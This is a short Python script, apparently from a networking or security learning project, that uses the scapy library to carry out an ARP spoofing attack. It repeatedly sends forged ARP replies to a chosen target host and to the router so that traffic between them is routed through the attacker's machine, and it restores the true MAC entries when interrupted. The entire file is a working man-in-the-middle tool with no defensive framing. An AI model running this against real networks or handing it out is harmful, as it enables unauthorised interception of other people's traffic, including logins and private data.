import scapy.all as scapy
import time
from get_mac_module import get_mac
from get_arguments import get_arguments

system = get_arguments()

def spoof(router_ip, target_ip):
    router_mac = get_mac(router_ip)
    target_mac = get_mac(target_ip)
    if (router_mac is not None) and (target_mac is not None):
        arp_spoof_to_target = scapy.ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
        arp_spoof_to_router = scapy.ARP(op=2, psrc=target_ip, pdst=router_ip, hwdst=router_mac)
        try:
            packets_count = 0
            while True:
                scapy.send(arp_spoof_to_target, verbose=False)
                scapy.send(arp_spoof_to_router, verbose=False)
                packets_count += 2
                print(f"\r[+] Packets Sent: {packets_count}", end="")
                time.sleep(2)

        except KeyboardInterrupt:
            print(f"[-] Pressed Ctrl+C Quitting Program....")
            # Sending arp response to both target and router directing them to correct MAC Address
            arp_message_to_target = scapy.ARP(op=2, psrc=router_ip, hwsrc=router_mac , pdst=target_ip, hwdst=target_mac)
            arp_message_to_router = scapy.ARP(op=2, psrc=target_ip, hwsrc=target_mac , pdst=router_ip, hwdst=router_mac)
            scapy.send(arp_message_to_router, verbose=False, count=4)
            scapy.send(arp_message_to_target, verbose=False, count=4)
    else:
        if target_mac == None:
            print(f"[-] Target is Unreachable")
            exit()
        else:
            print(f"[-] Access Point is Unreacable")
            exit()
        



spoof(system.access_point, system.target)
